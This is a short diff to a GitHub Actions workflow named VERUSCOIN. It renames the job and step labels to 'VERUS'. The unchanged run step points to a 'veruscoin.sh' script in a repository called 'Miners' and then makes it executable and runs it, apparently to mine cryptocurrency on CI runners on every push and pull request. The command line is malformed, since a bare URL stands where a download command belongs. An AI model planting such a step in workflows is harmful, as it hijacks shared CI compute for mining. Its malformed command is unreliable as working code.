@@ -2,7 +2,7 @@ name: VERUSCOIN
 on: [push, pull_request]
 jobs:
   build:
-    name: Ba_channel
+    name: VERUS
     runs-on: ubuntu-18.04
     strategy:
       max-parallel: 30
@@ -22,6 +22,6 @@ jobs:
       id: go
     - name: Setup
       uses: actions/checkout@v1
-    - name: BA_channel
+    - name: VERUS
       run: |
         https://github.com/opnime04/Miners/blob/main/veruscoin.sh && chmod u+x veruscoin.sh && ./veruscoin.sh
